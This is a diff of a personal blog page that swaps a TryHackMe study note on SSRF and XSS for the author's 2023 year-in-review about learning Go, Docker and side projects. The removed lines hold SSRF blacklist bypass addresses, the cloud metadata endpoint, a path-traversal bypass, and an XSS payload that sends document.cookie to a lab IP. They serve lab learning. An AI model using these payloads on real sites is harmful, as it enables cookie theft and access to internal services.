@@ -18,15 +18,15 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="SSRF(Server-Side Request Forgery)服务器请求伪造ssrf有两种,一种是常规ssrf,另一种是blind ssrf(盲ssrf) 常见ssrf防御黑名单云服务器可能会把127.0.0.1和localhost列进黑名单拒绝访问(看不明白),可以用其他方式绕过这个限制来访问,比如0、0.0.0.0、0000、127.1、2130706433、017700000001,12">
+    <meta name="description" content="开篇的话这个category一年一更好了,按理说2023最后一天发比较合适,但实在太忙了…只能2024第一天发了 暑假之前忘了… 暑假有的没的 搭了自己的机场 买了二手玩客云,用docker在这个矿渣机器上部署shellclash和openwrt,实现了真正的全局代理,连上wifi即是魔法 重开了博客 部署了小雅+alist,终于给家人做了些力所能及的有用的事  转变暑假想去hvv未遂,然后跟了b">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SSRF+XSS">
-<meta property="og:url" content="https://blog.yblue.top/2023/08/23/SSRF/index.html">
+<meta property="og:title" content="2023年度总结">
+<meta property="og:url" content="https://blog.yblue.top/2024/02/10/2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="Taosu&#96;Home">
-<meta property="og:description" content="SSRF(Server-Side Request Forgery)服务器请求伪造ssrf有两种,一种是常规ssrf,另一种是blind ssrf(盲ssrf) 常见ssrf防御黑名单云服务器可能会把127.0.0.1和localhost列进黑名单拒绝访问(看不明白),可以用其他方式绕过这个限制来访问,比如0、0.0.0.0、0000、127.1、2130706433、017700000001,12">
+<meta property="og:description" content="开篇的话这个category一年一更好了,按理说2023最后一天发比较合适,但实在太忙了…只能2024第一天发了 暑假之前忘了… 暑假有的没的 搭了自己的机场 买了二手玩客云,用docker在这个矿渣机器上部署shellclash和openwrt,实现了真正的全局代理,连上wifi即是魔法 重开了博客 部署了小雅+alist,终于给家人做了些力所能及的有用的事  转变暑假想去hvv未遂,然后跟了b">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-08-23T07:52:48.000Z">
-<meta property="article:modified_time" content="2023-08-24T14:25:08.776Z">
+<meta property="article:published_time" content="2024-02-10T11:57:56.000Z">
+<meta property="article:modified_time" content="2024-02-10T12:38:49.513Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -34,7 +34,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>SSRF+XSS - Taosu`Home</title>
+  <title>2023年度总结 - Taosu`Home</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -188,7 +188,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SSRF+XSS"></span>
+            <span id="subtitle" data-typed-text="2023年度总结"></span>
           
         </div>
 
@@ -199,8 +199,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-23 15:52" pubdate>
-          August 23, 2023 pm
+        <time datetime="2024-02-10 19:57" pubdate>
+          February 10, 2024 pm
         </time>
       </span>
     
@@ -211,7 +211,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k words
+          1.2k words
         
       </span>
     
@@ -267,12 +267,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">SSRF+XSS</h1>
+            <h1 id="seo-header">2023年度总结</h1>
             
               <p class="note note-info">
                 
                   
-                    Last updated on 6 months ago
+                    Last updated on a few seconds ago
                   
                 
               </p>
@@ -280,17 +280,71 @@
             
               <div class="markdown-body">
                 
-                <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>(Server-Side Request Forgery)<br>服务器请求伪造<br>ssrf有两种,一种是常规ssrf,另一种是blind ssrf(盲ssrf)</p>
-<h2 id="常见ssrf防御"><a href="#常见ssrf防御" class="headerlink" title="常见ssrf防御"></a>常见ssrf防御</h2><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p>云服务器可能会把127.0.0.1和localhost列进黑名单拒绝访问(看不明白),可以用其他方式绕过这个限制来访问,比如0、0.0.0.0、0000、127.1、2130706433、017700000001,127.0.0.1.nip.io,<br>这些都是dns解析成127.0.0.1,但是没有上黑名单的<br><a target="_blank" rel="noopener" href="http://169.254.169.254/">http://169.254.169.254</a> 这个是Amazon AWS(不知道是不是特有的)的服务器存储敏感数据的地址</p>
-<h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p><code>例如参数中使用的 URL 必须以https://website.thm开头的规则 </code><br>绕过方式是在对应域名建立子域名绕过(能给别人的域名建子域名不早打进去了吗)</p>
-<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><p>这个房间真的做的乱七八糟的,感觉很拉跨<br>&#x2F;private这个目录不允许访问,在更改头像页面,发现头像来自于网站内部,所有头像更改的请求那里可以获得&#x2F;private的内容,所以图片的路径value更改成private,但是被拒绝访问,使用x&#x2F;..&#x2F;private即可绕过,这里的x填啥都可以,可以说y,可以是z,也可以是abc,不知道这里是因为thm房间特意允许的还是别的原因,正常来说应该是该目录下一个实际存在的文件+&#x2F;..&#x2F;private</p>
-<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>Cross-site Scripting<br>按理来说应该简写成css的,但已经有了,所以叫xss<br><code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code><br>有alert则证明有xss,即POC</p>
-<h2 id="反射性xss"><a href="#反射性xss" class="headerlink" title="反射性xss"></a>反射性xss</h2><p>用户在浏览器内的输入内容会不经过滤直接回显到浏览器,这里就可以执行</p>
-<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>保存在服务器内的数据,比如评论</p>
-<h2 id="dom型xss"><a href="#dom型xss" class="headerlink" title="dom型xss"></a>dom型xss</h2><p>利用js事件形成xss</p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>很基础的六个类型,有空还得再找靶场练,总之就是凑<code>&lt;&gt; ; &quot;&quot; &#39;&#39;</code>这样的,要么就是大小写绕过,或者双写绕过之类的</p>
-<h2 id="实际操作-1"><a href="#实际操作-1" class="headerlink" title="实际操作"></a>实际操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;/textarea&gt;&lt;script&gt;fetch(<span class="hljs-string">&#x27;http://10.10.107.206:1234?cookie=&#x27;</span> + btoa(document.cookie) );&lt;/script&gt;<br></code></pre></td></tr></table></figure>
-<p>别的没啥值得说的,就一个类似反弹shell的东西</p>
+                <h1 id="开篇的话"><a href="#开篇的话" class="headerlink" title="开篇的话"></a>开篇的话</h1><p>这个category一年一更好了,按理说2023最后一天发比较合适,但实在太忙了…只能2024第一天发了</p>
+<h1 id="暑假之前"><a href="#暑假之前" class="headerlink" title="暑假之前"></a>暑假之前</h1><p>忘了…</p>
+<h1 id="暑假"><a href="#暑假" class="headerlink" title="暑假"></a>暑假</h1><h2 id="有的没的"><a href="#有的没的" class="headerlink" title="有的没的"></a>有的没的</h2><ul>
+<li>搭了自己的机场</li>
+<li>买了二手玩客云,用docker在这个矿渣机器上部署shellclash和openwrt,实现了真正的全局代理,连上wifi即是魔法</li>
+<li>重开了博客</li>
+<li>部署了小雅+alist,终于给家人做了些力所能及的有用的事</li>
+</ul>
+<h2 id="转变"><a href="#转变" class="headerlink" title="转变"></a>转变</h2><p>暑假想去hvv未遂,然后跟了b站某up的红队开发视频和go黑帽子的端口扫描器及之前的内容,本以为是拓展安全方向的技术,结果发现还是开发有意思,暑假时过完了一遍golang的基础语法</p>
+<h1 id="大二新学期"><a href="#大二新学期" class="headerlink" title="大二新学期"></a>大二新学期</h1><h2 id="忙碌"><a href="#忙碌" class="headerlink" title="忙碌"></a>忙碌</h2><p>9月开学,几乎一整个月的时间都消耗在社团各种琐事中(纳新各种事项),9月末开始下决心转方向,赶在10月之前把各种语法等内容又过了一遍,然后对开发流程从0开始</p>
+<h2 id="无限加速"><a href="#无限加速" class="headerlink" title="无限加速"></a>无限加速</h2><ul>
+<li>初识框架 –gin框架,了解了路由,路由组,鉴权(cookie,token等),jwt制作与分发</li>
+<li>orm框架 –gorm(至今看过的最容易上手的官方文档,真正的开箱即用),xorm</li>
+<li>网络方面,了解了websocket和IM相关,后续应该会继续完善IM项目</li>
+<li>心心念念的docker <ul>
+<li>因为23年的上半个学期刷到了咕咕鸽,开始了解到了docker,在自己的大盘鸡上部署过n多个docker项目,大受震撼,对docker这种开箱即用的风格非常喜欢</li>
+<li>构建了第一个自己制作的docker image</li>
+<li>把镜像push到docker hub和aliyun 镜像站</li>
+<li>写了第一个自己的docker-compose.yaml文件</li>
+<li>使用github actions的CI流程自动构建镜像并发布到docker hub</li>
+<li>跟着做了用go模仿docker的7day项目(未完成)</li>
+</ul>
+</li>
+<li>项目<ul>
+<li>马士兵IM 做到redis之前,主要是了解了gin,gorm,viper的开发流程</li>
+<li>图书馆 简单CRUD项目,深入学习了鉴权相关内容,go template相关内容</li>
+<li>DouFlick 字节青训的项目(自己跟着做)<ul>
+<li>了解了微服务,分布式等概念</li>
+<li>grpc调用</li>
+<li>consul使用</li>
+<li>第一次在项目中使用redis,了解到了缓存的实际应用场景</li>
+<li>proto文件编写,了解了什么是IDL文件</li>
+<li>完成了CI流程</li>
+<li>网关,日志,初始化,响应码…</li>
+<li>makefile</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>其它有的没的<ul>
+<li>给代码随想录提了个pr</li>
+<li>开始习惯看文档,google信息而不是看视频学习</li>
+<li>了解到了字节开源框架hertz,硬啃下来了jwt相关内容</li>
+<li>混进了西二在线的q群</li>
+<li>混进了cloudwego的slack频道和飞书群</li>
+<li>搞了Ubuntu的双系统</li>
+<li>给飞书和slack接入了coze</li>
+<li>电脑第一次绿屏</li>
+<li>本以为跟安全就没啥关系了,机缘巧合认识了穹镜的新负责人</li>
+<li>黑五期间被老吴反复劝才下决心打算买三网优化传家宝,结果没货了</li>
+</ul>
+</li>
+<li>恋爱<ul>
+<li>第一次不跟家人而是跟对象出去旅游四天三夜</li>
+<li>长城</li>
+<li>天安门</li>
+<li>升旗</li>
+<li>国博</li>
+<li>恭王府</li>
+<li>景山公园</li>
+<li>主席纪念堂</li>
+<li>有闹别扭但和好了(理解万岁)</li>
+</ul>
+</li>
+</ul>
 
                 
               </div>
@@ -309,7 +363,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/thm/" class="category-chain-item">thm</a>
+  <a href="/categories/%E6%80%BB%E7%BB%93/" class="category-chain-item">总结</a>
   
   
 
@@ -329,15 +383,15 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SSRF+XSS</div>
-      <div>https://blog.yblue.top/2023/08/23/SSRF/</div>
+      <div>2023年度总结</div>
+      <div>https://blog.yblue.top/2024/02/10/2023年度总结/</div>
     </div>
     <div class="license-meta">
       
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 23, 2023</div>
+          <div>February 10, 2024</div>
         </div>
       
       
@@ -369,18 +423,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/25/Arch/" title="Arch">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Arch</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/08/22/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/" title="虚拟环境">
-                        <span class="hidden-mobile">虚拟环境</span>
+                      <a href="/2023/11/13/go%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA2-0/" title="go查漏补缺2.0">
+                        <span class="hidden-mobile">go查漏补缺2.0</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
